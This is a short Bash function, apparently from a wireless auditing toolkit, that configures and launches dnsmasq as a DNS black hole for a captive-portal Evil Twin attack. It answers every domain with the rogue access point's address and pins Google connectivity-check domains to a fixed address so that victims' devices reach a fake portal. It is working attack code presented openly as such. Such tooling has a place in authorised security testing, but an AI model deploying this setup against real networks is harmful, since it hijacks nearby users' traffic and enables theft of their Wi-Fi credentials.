#Launch dnsmasq dns black hole for captive portal Evil Twin attack
function launch_dns_blackhole() {

	debug_print

	recalculate_windows_sizes

	tmpfiles_toclean=1
	rm -rf "${tmpdir}${dnsmasq_file}" > /dev/null 2>&1

	{
	echo -e "interface=${interface}"
	echo -e "address=/#/${et_ip_router}"
	echo -e "address=/google.com/172.217.5.238"
	echo -e "address=/gstatic.com/172.217.5.238"
	echo -e "no-dhcp-interface=${interface}"
	echo -e "log-queries"
	echo -e "no-daemon"
	echo -e "no-resolv"
	echo -e "no-hosts"
	} >> "${tmpdir}${dnsmasq_file}"

	manage_output "-hold -bg \"#000000\" -fg \"#0000FF\" -geometry ${g4_middleright_window} -T \"DNS\"" "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\"" "DNS"
	if [ "${AIRGEDDON_WINDOWS_HANDLING}" = "xterm" ]; then
		et_processes+=($!)
	else
		get_tmux_process_id "${optional_tools_names[11]} -C \"${tmpdir}${dnsmasq_file}\""
		et_processes+=("${global_process_pid}")
		global_process_pid=""
	fi
}
